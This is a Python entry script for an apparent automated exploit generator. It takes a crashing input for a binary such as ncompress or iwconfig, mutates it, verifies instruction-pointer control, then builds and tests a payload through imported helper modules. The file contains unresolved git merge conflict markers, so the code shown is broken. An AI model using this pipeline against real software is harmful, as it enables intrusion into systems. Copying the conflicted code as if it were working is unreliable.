from utils import *
from payload_utils import *
from exploit_utils import *
from exploration_ulits import *
from dataclass_utils import *


# @@ --> argv input (inline raw bytes or file path)
# (no @@) --> stdin input
# ./autoexploit.py -i path/to/crash -- /mnt/binaries/ncompress @@
# ./autoexploit.py -i path/to/crash -- /mnt/binaries/iwconfig @@
# ./autoexploit.py -i path/to/crash -- /mnt/binaries/aspell c
# ./autoexploit.py -i path/to/crash -- /mnt/binaries/vuln


def main():

    if len(sys.argv) < 2:
        logging.error("No target binary provided")
        sys.exit(1)

    target_obj = check_args()
<<<<<<< HEAD
    context.log_level = "warn"
=======
    # context.log_level='warn'
>>>>>>> 40e10ed (pwn process)
    # context.log_level = 'debug'
    context.log_level='error'

    reproducer(target_obj)

    crash_mutation = crash_explorer(target_obj)
<<<<<<< HEAD

    if crash_mutation == None:
=======
    print(f'mutation: {crash_mutation}')
    if(crash_mutation == None):
>>>>>>> 40e10ed (pwn process)
        logging.error("No successful crash input mutation found.")
        sys.exit(1)

    target_obj.target_input.content = crash_mutation

    verify_eip_control(target_obj)

    payload_builder(target_obj)

    payload_tester(target_obj)


if __name__ == "__main__":
    main()
